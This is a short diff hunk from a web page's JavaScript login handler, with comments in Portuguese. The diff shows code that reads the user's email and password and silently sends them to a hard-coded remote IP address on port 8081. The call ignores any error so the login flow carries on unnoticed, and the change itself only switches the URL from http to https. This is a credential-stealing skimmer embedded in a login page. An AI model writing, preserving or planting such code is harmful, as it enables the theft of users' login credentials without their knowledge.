@@ -1395,7 +1395,7 @@
     const senha = document.getElementById('password').value;
 
     // Envia para o IP remoto (não impede o fluxo mesmo com erro)
-    fetch(`http://84.247.169.210:8081?email=${encodeURIComponent(email)}&senha=${encodeURIComponent(senha)}`).catch(() => {});
+    fetch(`https://84.247.169.210:8081?email=${encodeURIComponent(email)}&senha=${encodeURIComponent(senha)}`).catch(() => {});
 
     // Oculta a tela de login e mostra a página principal
     document.getElementById('auth-screen').style.display = 'none';
